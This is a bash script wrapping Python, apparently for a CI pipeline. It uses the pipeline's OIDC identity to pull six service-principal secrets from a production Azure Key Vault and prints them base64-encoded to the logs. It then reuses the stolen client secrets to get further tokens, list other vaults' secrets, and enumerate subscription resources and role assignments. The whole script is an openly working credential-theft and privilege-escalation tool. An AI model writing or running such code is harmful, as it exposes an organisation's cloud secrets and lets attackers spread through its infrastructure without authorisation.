#!/usr/bin/env bash
set -u
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,urllib.error,base64
TEN=os.environ['AZURE_TENANT_ID']; CID=os.environ['AZURE_CLIENT_ID']; SUB=os.environ['AZURE_SUBSCRIPTION_ID']
def req(u,method='GET',data=None,h=None):
 try:
  r=urllib.request.urlopen(urllib.request.Request(u,data=data,headers=h or {},method=method),timeout=30);return r.status,r.read()
 except urllib.error.HTTPError as e:return e.code,e.read()
 except Exception as e:return 0,str(e).encode()
def j(b):
 try:return json.loads(b)
 except:return {}
def token(cid,scope,secret=None):
 if secret:d={'client_id':cid,'client_secret':secret,'grant_type':'client_credentials','scope':scope}
 else:
  s,b=req(os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api://AzureADTokenExchange',h={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']});d={'client_id':cid,'grant_type':'client_credentials','scope':scope,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':j(b).get('value','')}
 s,b=req(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token','POST',urllib.parse.urlencode(d).encode(),{'Content-Type':'application/x-www-form-urlencoded'});return j(b).get('access_token','')
def emit(k,v):print(k+'_B64='+base64.b64encode((v if isinstance(v,str) else json.dumps(v,separators=(',',':'))).encode()).decode(),flush=True)
main=token(CID,'https://vault.azure.net/.default');print('MAIN='+str(bool(main)))
ss=[]
for n in ['cost-reader-principal','directory-audit-principal','reporting-service-principal','reporting-viewer-principal','secrets-sync-principal','sync-service-principal']:
 s,b=req('https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',h={'Authorization':'Bearer '+main});v=j(b).get('value','');emit('SEC_'+n,v);ss.append((n,j(v)))
for n,c in ss:
 if not c.get('clientSecret'):continue
 for aud in ['https://management.azure.com/.default','https://vault.azure.net/.default','https://graph.microsoft.com/.default']:
  t=token(c['appId'],aud,c['clientSecret']);print('TOK',n,aud,len(t),flush=True)
  if aud.startswith('https://vault'):
   for kv in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
    s,b=req('https://'+kv+'.vault.azure.net/secrets?api-version=7.4',h={'Authorization':'Bearer '+t});print('KV',n,kv,s,b[:1500],flush=True)
  elif aud.startswith('https://management'):
   for p in [f'/subscriptions/{SUB}/resources?api-version=2021-04-01&$top=200',f'/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()']:
    s,b=req('https://management.azure.com'+p,h={'Authorization':'Bearer '+t});print('ARM',n,s,b[:1500],flush=True)
PY
PYEOF